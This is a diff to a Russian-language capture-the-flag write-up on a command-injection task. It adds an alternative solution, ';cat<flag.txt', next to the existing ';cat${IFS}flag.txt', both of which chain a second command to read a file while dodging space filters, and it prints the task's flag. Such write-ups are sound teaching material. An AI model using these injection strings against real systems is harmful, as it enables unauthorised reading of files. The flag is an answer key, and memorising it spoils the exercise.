@@ -43,6 +43,10 @@
 Вводим `;cat${IFS}flag.txt` и получаем флаг:
 `WOW! There is a vulnerability on my server! Secret data from the Urals: iset{w3_L1K3_C0MM4nd_1nj3C710N}`
 
+### Решение 2
+
+`;cat<flag.txt`
+
 **Флаг:**
 
 > iset{w3_L1K3_C0MM4nd_1nj3C710N}
